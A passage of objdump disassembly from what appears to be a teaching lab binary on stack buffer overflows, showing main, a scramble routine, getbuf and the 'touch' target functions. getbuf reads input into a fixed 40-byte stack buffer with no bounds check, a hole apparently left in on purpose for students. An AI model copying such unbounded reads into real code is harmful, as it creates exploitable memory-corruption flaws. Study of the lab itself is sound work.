  401792:       48 8d 35 87 29 00 00    lea    0x2987(%rip),%rsi        # 404120 <_IO_stdin_used+0x120>
  401799:       bf 01 00 00 00          mov    $0x1,%edi
  40179e:       b8 00 00 00 00          mov    $0x0,%eax
  4017a3:       e8 38 fc ff ff          call   4013e0 <__printf_chk@plt>
  4017a8:       bf 08 00 00 00          mov    $0x8,%edi
  4017ad:       e8 7e fc ff ff          call   401430 <exit@plt>
  4017b2:       e8 39 fb ff ff          call   4012f0 <__stack_chk_fail@plt>

00000000004017b7 <main>:
  4017b7:       f3 0f 1e fa             endbr64
  4017bb:       41 56                   push   %r14
  4017bd:       41 55                   push   %r13
  4017bf:       41 54                   push   %r12
  4017c1:       55                      push   %rbp
  4017c2:       53                      push   %rbx
  4017c3:       89 fd                   mov    %edi,%ebp
  4017c5:       48 89 f3                mov    %rsi,%rbx
  4017c8:       48 c7 c6 66 27 40 00    mov    $0x402766,%rsi
  4017cf:       bf 0b 00 00 00          mov    $0xb,%edi
  4017d4:       e8 77 fb ff ff          call   401350 <signal@plt>
  4017d9:       48 c7 c6 0c 27 40 00    mov    $0x40270c,%rsi
  4017e0:       bf 07 00 00 00          mov    $0x7,%edi
  4017e5:       e8 66 fb ff ff          call   401350 <signal@plt>
  4017ea:       48 c7 c6 c0 27 40 00    mov    $0x4027c0,%rsi
  4017f1:       bf 04 00 00 00          mov    $0x4,%edi
  4017f6:       e8 55 fb ff ff          call   401350 <signal@plt>
  4017fb:       83 3d 56 5d 00 00 00    cmpl   $0x0,0x5d56(%rip)        # 407558 <is_checker>
  401802:       75 26                   jne    40182a <main+0x73>
  401804:       4c 8d 25 1a 2a 00 00    lea    0x2a1a(%rip),%r12        # 404225 <_IO_stdin_used+0x225>
  40180b:       48 8b 05 ae 5c 00 00    mov    0x5cae(%rip),%rax        # 4074c0 <stdin@GLIBC_2.2.5>
  401812:       48 89 05 27 5d 00 00    mov    %rax,0x5d27(%rip)        # 407540 <infile>
  401819:       41 bd 00 00 00 00       mov    $0x0,%r13d
  40181f:       41 be 00 00 00 00       mov    $0x0,%r14d
  401825:       e9 8d 00 00 00          jmp    4018b7 <main+0x100>
  40182a:       48 c7 c6 1a 28 40 00    mov    $0x40281a,%rsi
  401831:       bf 0e 00 00 00          mov    $0xe,%edi
  401836:       e8 15 fb ff ff          call   401350 <signal@plt>
  40183b:       bf 05 00 00 00          mov    $0x5,%edi
  401840:       e8 db fa ff ff          call   401320 <alarm@plt>
  401845:       4c 8d 25 de 29 00 00    lea    0x29de(%rip),%r12        # 40422a <_IO_stdin_used+0x22a>
  40184c:       eb bd                   jmp    40180b <main+0x54>
  40184e:       48 8b 3b                mov    (%rbx),%rdi
  401851:       e8 20 fd ff ff          call   401576 <usage>
  401856:       48 8d 35 20 2c 00 00    lea    0x2c20(%rip),%rsi        # 40447d <_IO_stdin_used+0x47d>
  40185d:       48 8b 3d 7c 5c 00 00    mov    0x5c7c(%rip),%rdi        # 4074e0 <optarg@GLIBC_2.2.5>
  401864:       e8 87 fb ff ff          call   4013f0 <fopen@plt>
  401869:       48 89 05 d0 5c 00 00    mov    %rax,0x5cd0(%rip)        # 407540 <infile>
  401870:       48 85 c0                test   %rax,%rax
  401873:       75 42                   jne    4018b7 <main+0x100>
  401875:       48 8b 0d 64 5c 00 00    mov    0x5c64(%rip),%rcx        # 4074e0 <optarg@GLIBC_2.2.5>
  40187c:       48 8d 15 af 29 00 00    lea    0x29af(%rip),%rdx        # 404232 <_IO_stdin_used+0x232>
  401883:       be 01 00 00 00          mov    $0x1,%esi
  401888:       48 8b 3d 71 5c 00 00    mov    0x5c71(%rip),%rdi        # 407500 <stderr@GLIBC_2.2.5>
  40188f:       e8 bc fb ff ff          call   401450 <__fprintf_chk@plt>
  401894:       b8 01 00 00 00          mov    $0x1,%eax
  401899:       e9 db 00 00 00          jmp    401979 <main+0x1c2>
  40189e:       ba 10 00 00 00          mov    $0x10,%edx
  4018a3:       be 00 00 00 00          mov    $0x0,%esi
  4018a8:       48 8b 3d 31 5c 00 00    mov    0x5c31(%rip),%rdi        # 4074e0 <optarg@GLIBC_2.2.5>
  4018af:       e8 5c fb ff ff          call   401410 <strtoul@plt>
  4018b4:       41 89 c6                mov    %eax,%r14d
  4018b7:       4c 89 e2                mov    %r12,%rdx
  4018ba:       48 89 de                mov    %rbx,%rsi
  4018bd:       89 ef                   mov    %ebp,%edi
  4018bf:       e8 3c fb ff ff          call   401400 <getopt@plt>
  4018c4:       3c ff                   cmp    $0xff,%al
  4018c6:       74 65                   je     40192d <main+0x176>
  4018c8:       0f be c8                movsbl %al,%ecx
  4018cb:       83 e8 61                sub    $0x61,%eax
  4018ce:       3c 10                   cmp    $0x10,%al
  4018d0:       77 3b                   ja     40190d <main+0x156>
  4018d2:       0f b6 c0                movzbl %al,%eax
  4018d5:       48 8d 15 94 29 00 00    lea    0x2994(%rip),%rdx        # 404270 <_IO_stdin_used+0x270>
  4018dc:       48 63 04 82             movslq (%rdx,%rax,4),%rax
  4018e0:       48 01 d0                add    %rdx,%rax
  4018e3:       3e ff e0                notrack jmp *%rax
  4018e6:       ba 0a 00 00 00          mov    $0xa,%edx
  4018eb:       be 00 00 00 00          mov    $0x0,%esi
  4018f0:       48 8b 3d e9 5b 00 00    mov    0x5be9(%rip),%rdi        # 4074e0 <optarg@GLIBC_2.2.5>
  4018f7:       e8 84 fa ff ff          call   401380 <strtol@plt>
  4018fc:       41 89 c5                mov    %eax,%r13d
  4018ff:       eb b6                   jmp    4018b7 <main+0x100>
  401901:       c7 05 9d 5b 00 00 00    movl   $0x0,0x5b9d(%rip)        # 4074a8 <notify>
  401908:       00 00 00
  40190b:       eb aa                   jmp    4018b7 <main+0x100>
  40190d:       89 ca                   mov    %ecx,%edx
  40190f:       48 8d 35 39 29 00 00    lea    0x2939(%rip),%rsi        # 40424f <_IO_stdin_used+0x24f>
  401916:       bf 01 00 00 00          mov    $0x1,%edi
  40191b:       b8 00 00 00 00          mov    $0x0,%eax
  401920:       e8 bb fa ff ff          call   4013e0 <__printf_chk@plt>
  401925:       48 8b 3b                mov    (%rbx),%rdi
  401928:       e8 49 fc ff ff          call   401576 <usage>
  40192d:       be 01 00 00 00          mov    $0x1,%esi
  401932:       44 89 ef                mov    %r13d,%edi
  401935:       e8 da fc ff ff          call   401614 <initialize_target>
  40193a:       83 3d 17 5c 00 00 00    cmpl   $0x0,0x5c17(%rip)        # 407558 <is_checker>
  401941:       74 09                   je     40194c <main+0x195>
  401943:       44 39 35 06 5c 00 00    cmp    %r14d,0x5c06(%rip)        # 407550 <authkey>
  40194a:       75 36                   jne    401982 <main+0x1cb>
  40194c:       8b 15 02 5c 00 00       mov    0x5c02(%rip),%edx        # 407554 <cookie>
  401952:       48 8d 35 09 29 00 00    lea    0x2909(%rip),%rsi        # 404262 <_IO_stdin_used+0x262>
  401959:       bf 01 00 00 00          mov    $0x1,%edi
  40195e:       b8 00 00 00 00          mov    $0x0,%eax
  401963:       e8 78 fa ff ff          call   4013e0 <__printf_chk@plt>
  401968:       48 8b 3d 41 5b 00 00    mov    0x5b41(%rip),%rdi        # 4074b0 <buf_offset>
  40196f:       e8 03 0f 00 00          call   402877 <launch>
  401974:       b8 00 00 00 00          mov    $0x0,%eax
  401979:       5b                      pop    %rbx
  40197a:       5d                      pop    %rbp
  40197b:       41 5c                   pop    %r12
  40197d:       41 5d                   pop    %r13
  40197f:       41 5e                   pop    %r14
  401981:       c3                      ret
  401982:       44 89 f2                mov    %r14d,%edx
  401985:       48 8d 35 fc 27 00 00    lea    0x27fc(%rip),%rsi        # 404188 <_IO_stdin_used+0x188>
  40198c:       bf 01 00 00 00          mov    $0x1,%edi
  401991:       b8 00 00 00 00          mov    $0x0,%eax
  401996:       e8 45 fa ff ff          call   4013e0 <__printf_chk@plt>
  40199b:       b8 00 00 00 00          mov    $0x0,%eax
  4019a0:       e8 a7 09 00 00          call   40234c <check_fail>
  4019a5:       eb a5                   jmp    40194c <main+0x195>

00000000004019a7 <scramble>:
  4019a7:       f3 0f 1e fa             endbr64
  4019ab:       48 83 ec 38             sub    $0x38,%rsp
  4019af:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  4019b6:       00 00
  4019b8:       48 89 44 24 28          mov    %rax,0x28(%rsp)
  4019bd:       31 c0                   xor    %eax,%eax
  4019bf:       eb 10                   jmp    4019d1 <scramble+0x2a>
  4019c1:       69 d0 d2 5c 00 00       imul   $0x5cd2,%eax,%edx
  4019c7:       01 fa                   add    %edi,%edx
  4019c9:       89 c1                   mov    %eax,%ecx
  4019cb:       89 14 8c                mov    %edx,(%rsp,%rcx,4)
  4019ce:       83 c0 01                add    $0x1,%eax
  4019d1:       83 f8 09                cmp    $0x9,%eax
  4019d4:       76 eb                   jbe    4019c1 <scramble+0x1a>
  4019d6:       8b 44 24 18             mov    0x18(%rsp),%eax
  4019da:       69 c0 05 65 00 00       imul   $0x6505,%eax,%eax
  4019e0:       89 44 24 18             mov    %eax,0x18(%rsp)
  4019e4:       8b 44 24 24             mov    0x24(%rsp),%eax
  4019e8:       69 c0 cf 98 00 00       imul   $0x98cf,%eax,%eax
  4019ee:       89 44 24 24             mov    %eax,0x24(%rsp)
  4019f2:       8b 44 24 18             mov    0x18(%rsp),%eax
  4019f6:       69 c0 c6 93 00 00       imul   $0x93c6,%eax,%eax
  4019fc:       89 44 24 18             mov    %eax,0x18(%rsp)
  401a00:       8b 44 24 20             mov    0x20(%rsp),%eax
  401a04:       69 c0 61 66 00 00       imul   $0x6661,%eax,%eax
  401a0a:       89 44 24 20             mov    %eax,0x20(%rsp)
  401a0e:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401a12:       69 c0 63 eb 00 00       imul   $0xeb63,%eax,%eax
  401a18:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401a1c:       8b 44 24 14             mov    0x14(%rsp),%eax
  401a20:       69 c0 85 46 00 00       imul   $0x4685,%eax,%eax
  401a26:       89 44 24 14             mov    %eax,0x14(%rsp)
  401a2a:       8b 44 24 10             mov    0x10(%rsp),%eax
  401a2e:       69 c0 7b 32 00 00       imul   $0x327b,%eax,%eax
  401a34:       89 44 24 10             mov    %eax,0x10(%rsp)
  401a38:       8b 44 24 08             mov    0x8(%rsp),%eax
  401a3c:       69 c0 28 c5 00 00       imul   $0xc528,%eax,%eax
  401a42:       89 44 24 08             mov    %eax,0x8(%rsp)
  401a46:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401a4a:       69 c0 46 70 00 00       imul   $0x7046,%eax,%eax
  401a50:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401a54:       8b 44 24 20             mov    0x20(%rsp),%eax
  401a58:       69 c0 53 25 00 00       imul   $0x2553,%eax,%eax
  401a5e:       89 44 24 20             mov    %eax,0x20(%rsp)
  401a62:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401a66:       69 c0 7b d5 00 00       imul   $0xd57b,%eax,%eax
  401a6c:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401a70:       8b 44 24 24             mov    0x24(%rsp),%eax
  401a74:       69 c0 7f b2 00 00       imul   $0xb27f,%eax,%eax
  401a7a:       89 44 24 24             mov    %eax,0x24(%rsp)
  401a7e:       8b 44 24 10             mov    0x10(%rsp),%eax
  401a82:       69 c0 60 41 00 00       imul   $0x4160,%eax,%eax
  401a88:       89 44 24 10             mov    %eax,0x10(%rsp)
  401a8c:       8b 44 24 10             mov    0x10(%rsp),%eax
  401a90:       69 c0 f6 f6 00 00       imul   $0xf6f6,%eax,%eax
  401a96:       89 44 24 10             mov    %eax,0x10(%rsp)
  401a9a:       8b 44 24 10             mov    0x10(%rsp),%eax
  401a9e:       69 c0 05 b4 00 00       imul   $0xb405,%eax,%eax
  401aa4:       89 44 24 10             mov    %eax,0x10(%rsp)
  401aa8:       8b 44 24 14             mov    0x14(%rsp),%eax
  401aac:       69 c0 76 15 00 00       imul   $0x1576,%eax,%eax
  401ab2:       89 44 24 14             mov    %eax,0x14(%rsp)
  401ab6:       8b 44 24 10             mov    0x10(%rsp),%eax
  401aba:       69 c0 13 40 00 00       imul   $0x4013,%eax,%eax
  401ac0:       89 44 24 10             mov    %eax,0x10(%rsp)
  401ac4:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401ac8:       69 c0 80 d0 00 00       imul   $0xd080,%eax,%eax
  401ace:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401ad2:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401ad6:       69 c0 fc 42 00 00       imul   $0x42fc,%eax,%eax
  401adc:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401ae0:       8b 04 24                mov    (%rsp),%eax
  401ae3:       69 c0 65 2c 00 00       imul   $0x2c65,%eax,%eax
  401ae9:       89 04 24                mov    %eax,(%rsp)
  401aec:       8b 44 24 14             mov    0x14(%rsp),%eax
  401af0:       69 c0 f6 25 00 00       imul   $0x25f6,%eax,%eax
  401af6:       89 44 24 14             mov    %eax,0x14(%rsp)
  401afa:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401afe:       69 c0 b9 a9 00 00       imul   $0xa9b9,%eax,%eax
  401b04:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401b08:       8b 44 24 14             mov    0x14(%rsp),%eax
  401b0c:       69 c0 db 4c 00 00       imul   $0x4cdb,%eax,%eax
  401b12:       89 44 24 14             mov    %eax,0x14(%rsp)
  401b16:       8b 44 24 24             mov    0x24(%rsp),%eax
  401b1a:       69 c0 b3 9e 00 00       imul   $0x9eb3,%eax,%eax
  401b20:       89 44 24 24             mov    %eax,0x24(%rsp)
  401b24:       8b 44 24 24             mov    0x24(%rsp),%eax
  401b28:       69 c0 a4 79 00 00       imul   $0x79a4,%eax,%eax
  401b2e:       89 44 24 24             mov    %eax,0x24(%rsp)
  401b32:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401b36:       69 c0 ac ad 00 00       imul   $0xadac,%eax,%eax
  401b3c:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401b40:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401b44:       69 c0 36 8a 00 00       imul   $0x8a36,%eax,%eax
  401b4a:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401b4e:       8b 44 24 04             mov    0x4(%rsp),%eax
  401b52:       69 c0 22 77 00 00       imul   $0x7722,%eax,%eax
  401b58:       89 44 24 04             mov    %eax,0x4(%rsp)
  401b5c:       8b 44 24 08             mov    0x8(%rsp),%eax
  401b60:       69 c0 71 fd 00 00       imul   $0xfd71,%eax,%eax
  401b66:       89 44 24 08             mov    %eax,0x8(%rsp)
  401b6a:       8b 44 24 04             mov    0x4(%rsp),%eax
  401b6e:       69 c0 3b 84 00 00       imul   $0x843b,%eax,%eax
  401b74:       89 44 24 04             mov    %eax,0x4(%rsp)
  401b78:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401b7c:       69 c0 7d 86 00 00       imul   $0x867d,%eax,%eax
  401b82:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401b86:       8b 44 24 20             mov    0x20(%rsp),%eax
  401b8a:       69 c0 82 ca 00 00       imul   $0xca82,%eax,%eax
  401b90:       89 44 24 20             mov    %eax,0x20(%rsp)
  401b94:       8b 44 24 08             mov    0x8(%rsp),%eax
  401b98:       69 c0 f7 47 00 00       imul   $0x47f7,%eax,%eax
  401b9e:       89 44 24 08             mov    %eax,0x8(%rsp)
  401ba2:       8b 44 24 10             mov    0x10(%rsp),%eax
  401ba6:       69 c0 69 9a 00 00       imul   $0x9a69,%eax,%eax
  401bac:       89 44 24 10             mov    %eax,0x10(%rsp)
  401bb0:       8b 44 24 14             mov    0x14(%rsp),%eax
  401bb4:       69 c0 e3 d1 00 00       imul   $0xd1e3,%eax,%eax
  401bba:       89 44 24 14             mov    %eax,0x14(%rsp)
  401bbe:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401bc2:       69 c0 54 b9 00 00       imul   $0xb954,%eax,%eax
  401bc8:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401bcc:       8b 44 24 04             mov    0x4(%rsp),%eax
  401bd0:       69 c0 ba 39 00 00       imul   $0x39ba,%eax,%eax
  401bd6:       89 44 24 04             mov    %eax,0x4(%rsp)
  401bda:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401bde:       69 c0 4a 50 00 00       imul   $0x504a,%eax,%eax
  401be4:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401be8:       8b 44 24 10             mov    0x10(%rsp),%eax
  401bec:       69 c0 ee d1 00 00       imul   $0xd1ee,%eax,%eax
  401bf2:       89 44 24 10             mov    %eax,0x10(%rsp)
  401bf6:       8b 44 24 24             mov    0x24(%rsp),%eax
  401bfa:       69 c0 b6 43 00 00       imul   $0x43b6,%eax,%eax
  401c00:       89 44 24 24             mov    %eax,0x24(%rsp)
  401c04:       8b 44 24 08             mov    0x8(%rsp),%eax
  401c08:       69 c0 05 b3 00 00       imul   $0xb305,%eax,%eax
  401c0e:       89 44 24 08             mov    %eax,0x8(%rsp)
  401c12:       8b 44 24 24             mov    0x24(%rsp),%eax
  401c16:       69 c0 b2 9a 00 00       imul   $0x9ab2,%eax,%eax
  401c1c:       89 44 24 24             mov    %eax,0x24(%rsp)
  401c20:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401c24:       69 c0 8d 51 00 00       imul   $0x518d,%eax,%eax
  401c2a:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401c2e:       8b 44 24 14             mov    0x14(%rsp),%eax
  401c32:       69 c0 d2 08 00 00       imul   $0x8d2,%eax,%eax
  401c38:       89 44 24 14             mov    %eax,0x14(%rsp)
  401c3c:       8b 44 24 14             mov    0x14(%rsp),%eax
  401c40:       69 c0 ed 7f 00 00       imul   $0x7fed,%eax,%eax
  401c46:       89 44 24 14             mov    %eax,0x14(%rsp)
  401c4a:       8b 44 24 18             mov    0x18(%rsp),%eax
  401c4e:       6b c0 76                imul   $0x76,%eax,%eax
  401c51:       89 44 24 18             mov    %eax,0x18(%rsp)
  401c55:       8b 44 24 10             mov    0x10(%rsp),%eax
  401c59:       69 c0 bf 26 00 00       imul   $0x26bf,%eax,%eax
  401c5f:       89 44 24 10             mov    %eax,0x10(%rsp)
  401c63:       8b 44 24 18             mov    0x18(%rsp),%eax
  401c67:       69 c0 fa cc 00 00       imul   $0xccfa,%eax,%eax
  401c6d:       89 44 24 18             mov    %eax,0x18(%rsp)
  401c71:       8b 44 24 18             mov    0x18(%rsp),%eax
  401c75:       69 c0 fa 65 00 00       imul   $0x65fa,%eax,%eax
  401c7b:       89 44 24 18             mov    %eax,0x18(%rsp)
  401c7f:       8b 44 24 04             mov    0x4(%rsp),%eax
  401c83:       69 c0 aa f9 00 00       imul   $0xf9aa,%eax,%eax
  401c89:       89 44 24 04             mov    %eax,0x4(%rsp)
  401c8d:       8b 44 24 18             mov    0x18(%rsp),%eax
  401c91:       69 c0 33 2e 00 00       imul   $0x2e33,%eax,%eax
  401c97:       89 44 24 18             mov    %eax,0x18(%rsp)
  401c9b:       8b 44 24 14             mov    0x14(%rsp),%eax
  401c9f:       69 c0 b6 2f 00 00       imul   $0x2fb6,%eax,%eax
  401ca5:       89 44 24 14             mov    %eax,0x14(%rsp)
  401ca9:       8b 44 24 20             mov    0x20(%rsp),%eax
  401cad:       69 c0 0b 16 00 00       imul   $0x160b,%eax,%eax
  401cb3:       89 44 24 20             mov    %eax,0x20(%rsp)
  401cb7:       8b 44 24 18             mov    0x18(%rsp),%eax
  401cbb:       69 c0 82 ee 00 00       imul   $0xee82,%eax,%eax
  401cc1:       89 44 24 18             mov    %eax,0x18(%rsp)
  401cc5:       8b 04 24                mov    (%rsp),%eax
  401cc8:       69 c0 fe 6e 00 00       imul   $0x6efe,%eax,%eax
  401cce:       89 04 24                mov    %eax,(%rsp)
  401cd1:       8b 44 24 24             mov    0x24(%rsp),%eax
  401cd5:       69 c0 8d 33 00 00       imul   $0x338d,%eax,%eax
  401cdb:       89 44 24 24             mov    %eax,0x24(%rsp)
  401cdf:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401ce3:       69 c0 9b 23 00 00       imul   $0x239b,%eax,%eax
  401ce9:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401ced:       8b 44 24 08             mov    0x8(%rsp),%eax
  401cf1:       69 c0 3f 5f 00 00       imul   $0x5f3f,%eax,%eax
  401cf7:       89 44 24 08             mov    %eax,0x8(%rsp)
  401cfb:       8b 44 24 24             mov    0x24(%rsp),%eax
  401cff:       69 c0 14 e0 00 00       imul   $0xe014,%eax,%eax
  401d05:       89 44 24 24             mov    %eax,0x24(%rsp)
  401d09:       8b 44 24 08             mov    0x8(%rsp),%eax
  401d0d:       69 c0 27 c4 00 00       imul   $0xc427,%eax,%eax
  401d13:       89 44 24 08             mov    %eax,0x8(%rsp)
  401d17:       8b 44 24 14             mov    0x14(%rsp),%eax
  401d1b:       69 c0 1f f5 00 00       imul   $0xf51f,%eax,%eax
  401d21:       89 44 24 14             mov    %eax,0x14(%rsp)
  401d25:       8b 04 24                mov    (%rsp),%eax
  401d28:       69 c0 6c 66 00 00       imul   $0x666c,%eax,%eax
  401d2e:       89 04 24                mov    %eax,(%rsp)
  401d31:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401d35:       69 c0 95 8f 00 00       imul   $0x8f95,%eax,%eax
  401d3b:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401d3f:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401d43:       69 c0 94 8a 00 00       imul   $0x8a94,%eax,%eax
  401d49:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401d4d:       8b 44 24 24             mov    0x24(%rsp),%eax
  401d51:       69 c0 cb 9a 00 00       imul   $0x9acb,%eax,%eax
  401d57:       89 44 24 24             mov    %eax,0x24(%rsp)
  401d5b:       8b 44 24 18             mov    0x18(%rsp),%eax
  401d5f:       69 c0 6c 2d 00 00       imul   $0x2d6c,%eax,%eax
  401d65:       89 44 24 18             mov    %eax,0x18(%rsp)
  401d69:       8b 44 24 10             mov    0x10(%rsp),%eax
  401d6d:       69 c0 3d 37 00 00       imul   $0x373d,%eax,%eax
  401d73:       89 44 24 10             mov    %eax,0x10(%rsp)
  401d77:       8b 44 24 14             mov    0x14(%rsp),%eax
  401d7b:       69 c0 eb 30 00 00       imul   $0x30eb,%eax,%eax
  401d81:       89 44 24 14             mov    %eax,0x14(%rsp)
  401d85:       8b 44 24 04             mov    0x4(%rsp),%eax
  401d89:       69 c0 23 dd 00 00       imul   $0xdd23,%eax,%eax
  401d8f:       89 44 24 04             mov    %eax,0x4(%rsp)
  401d93:       8b 44 24 24             mov    0x24(%rsp),%eax
  401d97:       69 c0 43 35 00 00       imul   $0x3543,%eax,%eax
  401d9d:       89 44 24 24             mov    %eax,0x24(%rsp)
  401da1:       8b 44 24 20             mov    0x20(%rsp),%eax
  401da5:       69 c0 a5 51 00 00       imul   $0x51a5,%eax,%eax
  401dab:       89 44 24 20             mov    %eax,0x20(%rsp)
  401daf:       8b 44 24 20             mov    0x20(%rsp),%eax
  401db3:       69 c0 25 6e 00 00       imul   $0x6e25,%eax,%eax
  401db9:       89 44 24 20             mov    %eax,0x20(%rsp)
  401dbd:       8b 44 24 20             mov    0x20(%rsp),%eax
  401dc1:       69 c0 0f 37 00 00       imul   $0x370f,%eax,%eax
  401dc7:       89 44 24 20             mov    %eax,0x20(%rsp)
  401dcb:       8b 44 24 08             mov    0x8(%rsp),%eax
  401dcf:       69 c0 69 ea 00 00       imul   $0xea69,%eax,%eax
  401dd5:       89 44 24 08             mov    %eax,0x8(%rsp)
  401dd9:       8b 04 24                mov    (%rsp),%eax
  401ddc:       69 c0 75 35 00 00       imul   $0x3575,%eax,%eax
  401de2:       89 04 24                mov    %eax,(%rsp)
  401de5:       8b 44 24 18             mov    0x18(%rsp),%eax
  401de9:       69 c0 26 77 00 00       imul   $0x7726,%eax,%eax
  401def:       89 44 24 18             mov    %eax,0x18(%rsp)
  401df3:       8b 44 24 10             mov    0x10(%rsp),%eax
  401df7:       69 c0 2e 73 00 00       imul   $0x732e,%eax,%eax
  401dfd:       89 44 24 10             mov    %eax,0x10(%rsp)
  401e01:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401e05:       69 c0 72 46 00 00       imul   $0x4672,%eax,%eax
  401e0b:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401e0f:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401e13:       69 c0 f9 10 00 00       imul   $0x10f9,%eax,%eax
  401e19:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401e1d:       8b 44 24 18             mov    0x18(%rsp),%eax
  401e21:       69 c0 53 f8 00 00       imul   $0xf853,%eax,%eax
  401e27:       89 44 24 18             mov    %eax,0x18(%rsp)
  401e2b:       8b 44 24 14             mov    0x14(%rsp),%eax
  401e2f:       69 c0 46 55 00 00       imul   $0x5546,%eax,%eax
  401e35:       89 44 24 14             mov    %eax,0x14(%rsp)
  401e39:       8b 44 24 14             mov    0x14(%rsp),%eax
  401e3d:       69 c0 c2 74 00 00       imul   $0x74c2,%eax,%eax
  401e43:       89 44 24 14             mov    %eax,0x14(%rsp)
  401e47:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401e4b:       69 c0 e2 82 00 00       imul   $0x82e2,%eax,%eax
  401e51:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401e55:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401e59:       69 c0 cc d9 00 00       imul   $0xd9cc,%eax,%eax
  401e5f:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401e63:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401e67:       69 c0 1a c5 00 00       imul   $0xc51a,%eax,%eax
  401e6d:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401e71:       8b 44 24 08             mov    0x8(%rsp),%eax
  401e75:       69 c0 26 ac 00 00       imul   $0xac26,%eax,%eax
  401e7b:       89 44 24 08             mov    %eax,0x8(%rsp)
  401e7f:       8b 44 24 1c             mov    0x1c(%rsp),%eax
  401e83:       69 c0 df 77 00 00       imul   $0x77df,%eax,%eax
  401e89:       89 44 24 1c             mov    %eax,0x1c(%rsp)
  401e8d:       8b 44 24 14             mov    0x14(%rsp),%eax
  401e91:       69 c0 00 8c 00 00       imul   $0x8c00,%eax,%eax
  401e97:       89 44 24 14             mov    %eax,0x14(%rsp)
  401e9b:       8b 44 24 0c             mov    0xc(%rsp),%eax
  401e9f:       69 c0 af e7 00 00       imul   $0xe7af,%eax,%eax
  401ea5:       89 44 24 0c             mov    %eax,0xc(%rsp)
  401ea9:       8b 44 24 14             mov    0x14(%rsp),%eax
  401ead:       69 c0 13 c6 00 00       imul   $0xc613,%eax,%eax
  401eb3:       89 44 24 14             mov    %eax,0x14(%rsp)
  401eb7:       8b 44 24 14             mov    0x14(%rsp),%eax
  401ebb:       69 c0 fa 24 00 00       imul   $0x24fa,%eax,%eax
  401ec1:       89 44 24 14             mov    %eax,0x14(%rsp)
  401ec5:       b8 00 00 00 00          mov    $0x0,%eax
  401eca:       ba 00 00 00 00          mov    $0x0,%edx
  401ecf:       eb 0a                   jmp    401edb <scramble+0x534>
  401ed1:       89 c1                   mov    %eax,%ecx
  401ed3:       8b 0c 8c                mov    (%rsp,%rcx,4),%ecx
  401ed6:       01 ca                   add    %ecx,%edx
  401ed8:       83 c0 01                add    $0x1,%eax
  401edb:       83 f8 09                cmp    $0x9,%eax
  401ede:       76 f1                   jbe    401ed1 <scramble+0x52a>
  401ee0:       48 8b 44 24 28          mov    0x28(%rsp),%rax
  401ee5:       64 48 2b 04 25 28 00    sub    %fs:0x28,%rax
  401eec:       00 00
  401eee:       75 07                   jne    401ef7 <scramble+0x550>
  401ef0:       89 d0                   mov    %edx,%eax
  401ef2:       48 83 c4 38             add    $0x38,%rsp
  401ef6:       c3                      ret
  401ef7:       e8 f4 f3 ff ff          call   4012f0 <__stack_chk_fail@plt>

0000000000401efc <getbuf>:
  401efc:       f3 0f 1e fa             endbr64
  401f00:       48 83 ec 28             sub    $0x28,%rsp
  401f04:       48 89 e7                mov    %rsp,%rdi
  401f07:       e8 7e 04 00 00          call   40238a <Gets>
  401f0c:       b8 01 00 00 00          mov    $0x1,%eax
  401f11:       48 83 c4 28             add    $0x28,%rsp
  401f15:       c3                      ret

0000000000401f16 <touch1>:
  401f16:       f3 0f 1e fa             endbr64
  401f1a:       50                      push   %rax
  401f1b:       58                      pop    %rax
  401f1c:       48 83 ec 08             sub    $0x8,%rsp
  401f20:       c7 05 22 56 00 00 01    movl   $0x1,0x5622(%rip)        # 40754c <vlevel>
  401f27:       00 00 00
  401f2a:       48 8d 3d a5 23 00 00    lea    0x23a5(%rip),%rdi        # 4042d6 <_IO_stdin_used+0x2d6>
  401f31:       e8 8a f3 ff ff          call   4012c0 <puts@plt>
  401f36:       bf 01 00 00 00          mov    $0x1,%edi
  401f3b:       e8 cc 06 00 00          call   40260c <validate>
  401f40:       bf 00 00 00 00          mov    $0x0,%edi
  401f45:       e8 e6 f4 ff ff          call   401430 <exit@plt>

0000000000401f4a <touch2>:
  401f4a:       f3 0f 1e fa             endbr64
  401f4e:       50                      push   %rax
  401f4f:       58                      pop    %rax
  401f50:       48 83 ec 08             sub    $0x8,%rsp
  401f54:       89 fa                   mov    %edi,%edx
  401f56:       c7 05 ec 55 00 00 02    movl   $0x2,0x55ec(%rip)        # 40754c <vlevel>
  401f5d:       00 00 00
  401f60:       39 3d ee 55 00 00       cmp    %edi,0x55ee(%rip)        # 407554 <cookie>
  401f66:       74 2a                   je     401f92 <touch2+0x48>
